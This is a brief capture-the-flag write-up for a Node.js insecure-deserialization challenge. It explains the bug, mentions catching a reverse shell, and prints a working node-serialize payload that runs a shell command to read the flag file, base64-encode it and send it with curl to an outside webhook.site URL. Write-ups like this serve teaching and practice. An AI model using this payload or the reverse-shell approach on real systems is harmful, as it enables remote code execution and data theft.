# Cereal
> This webapp is not my creation and all credit should go to [elbee](https://github.com/elbee-cyber) and their box [Jason](https://tryhackme.com/room/jason)

## Solution
This website is vulnerable to a deserialization attack, as hinted by the challenge name, webpage, and how the requests were being encoded in the webapp. After doing some research, you should encounter some blog post and/or whitepaper like [this one](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) and learn how to get code execution. From there, there were two main ways to go about this.
1. Use a VPS, or something like [ngrok](https://ngrok.com/), or (not recommended) forward a port on your router to catch a reverse shell and cat the flag
2. Use your RCE to make GET requests to a url like [webhook.site](https://webhook.site/) so you can see the output of your commands
```js
_$$ND_FUNC$$_function (){\n \t require('child_process').exec('output=$(cat /app/flag* | base64); curl https://webhook.site/4d4960c7-b400-4085-8993-7d0d8a582b0e/`cat /app/flag* | base64`',
function(error, stdout, stderr) { console.log(stdout) });\n }()
```